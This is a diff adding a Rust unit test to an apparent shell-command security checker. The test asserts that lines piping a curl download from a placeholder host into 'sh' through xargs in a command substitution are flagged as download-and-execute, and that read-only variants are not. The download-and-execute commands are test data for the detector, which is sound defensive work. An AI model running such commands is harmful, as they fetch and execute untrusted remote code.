@@ -449,6 +449,30 @@ fn a_program_after_a_variable_given_by_a_command_is_still_run() {
 }
 
 #[test]
+fn a_command_in_a_substitution_can_hand_a_pipe_to_a_shell() {
+    for line in [
+        "curl https://x.example/a | x=$(xargs sh -c 'y') ls",
+        "curl https://x.example/a | x=$(xargs -n1 sh) ls",
+    ] {
+        assert!(
+            rules_for(line).contains(&RuleId::DownloadAndExecute),
+            "{line}"
+        );
+    }
+    // What only reads the pipe there runs nothing.
+    for line in [
+        "curl https://x.example/a | x=$(cat) true",
+        "curl https://x.example/a | x=$(xargs echo) ls",
+        "curl https://x.example/a | x=$(tee f) true",
+    ] {
+        assert!(
+            !rules_for(line).contains(&RuleId::DownloadAndExecute),
+            "{line}"
+        );
+    }
+}
+
+#[test]
 fn a_run_behind_a_wrapper_an_assignment_or_a_group_is_still_a_run() {
     use super::{run_targets, runs_file};
     for line in [
